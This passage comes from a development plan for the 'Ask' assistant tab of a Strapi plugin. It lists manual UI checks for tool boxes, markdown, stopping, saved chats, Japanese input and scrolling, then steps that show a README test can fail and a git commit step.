5. **A turn.** Press the starter "Which visits are waiting for staff?". Three dots show in an assistant bubble, then the answer streams in. A tool box reads `Tool: list_requests` with a spinner, then a count such as "3 results". It is closed at first. Opened, it shows indented JSON with no `<customer_...>` tags, and customers masked like `line:U4af…88`. While a tool runs below text that has come, "Working on it…" shows under the box. Text and boxes are in the order they happened.
6. **A failed box.** Ask for a request that does not exist, for example "Show the request with the reference APT-0000". The box for that lookup has a red border and "failed" in red, and opened it shows the tool's own message.
7. **Markdown.** Ask for a table of the open questions with their reference, status and date: it draws as a table. Make the window narrow: a wide table scrolls sideways inside its bubble and the chat does not widen. Ask for a list and for a line of code: the list has its markers, and a long line of code scrolls inside its box. Ask the assistant to include a link to `https://example.com`: it opens in a new tab. Ask it to include an image: none is drawn.
8. **Stop and a lost connection.** Press **Stop** while an answer streams: what came stays, no red box shows, and no tool box keeps spinning. Stop Strapi in the middle of an answer: the red box reads "The connection to Strapi was lost. Try again.", and the question is back in the text box.
9. **Saved chats.** After a turn, open **History**: the chat is listed with its first message as its title. Reload the page: Ask opens on that chat. Press **New chat**: the old chat stays in the sidebar, and the next turn is saved as a chat of its own. Press the old row: it opens. Hover a row, or Tab to it: the trash button shows, and pressing it deletes the chat at once. Delete the open chat: the empty state shows. While an answer comes, the rows, New chat and the trash buttons are off. Sign in as another admin: none of the first admin's chats are listed. Press **Reset demo activity** on another tab, then reload: the list is empty.
10. **Japanese and long text.** With a Japanese input method, type 今日のお客様からの問い合わせは? and press Enter to confirm the conversion: nothing is sent. Press Enter again: it sends. Shift+Enter adds a line, and a box with ten pasted lines grows to six lines and then scrolls. Send a first message of 100 emoji or Japanese characters: its title in the sidebar is cut at 80 characters, and no character is split.
11. **Keyboard and focus.** With the sidebar closed, Tab skips its buttons. After pressing **Send**, or a starter, the focus is in the text box.
12. **Scrolling.** While an answer streams, scroll up: the list does not pull you back down. Send a message: the list goes to the bottom.

- [ ] **Step 8: Prove the test can fail**

Make each change, run the file, see it fail, and undo the change.

In `README.md`, change the limit in the table of limits from 20 to 25.

Run: `npm test -- test/unit/readme-ask.test.ts`
Expected: FAIL, among others: `the README's section on the Ask tab > gives the limits as the code has them`.

In `README.md`, under "Routes", rename `GET /conversations` to `GET /chats`.

Run: `npm test -- test/unit/readme-ask.test.ts`
Expected: FAIL, among others: `the README's section on the Ask tab > lists every route of the assistant and of the saved chats, as the server serves them`.

In `server/src/assistant/tools.ts`, change the label of `view_product` to "Product detail".

Run: `npm test -- test/unit/readme-ask.test.ts`
Expected: FAIL, among others: `the README's section on the Ask tab > names every read tool with its label, in the table of tools`.

- [ ] **Step 9: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/CHANGELOG.md strapi/src/plugins/maison/README.md strapi/src/plugins/maison/test/unit/readme-ask.test.ts
git commit -m "docs: the Ask tab in the README and the CHANGELOG" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/CHANGELOG.md strapi/src/plugins/maison/README.md strapi/src/plugins/maison/test/unit/readme-ask.test.ts
```


---
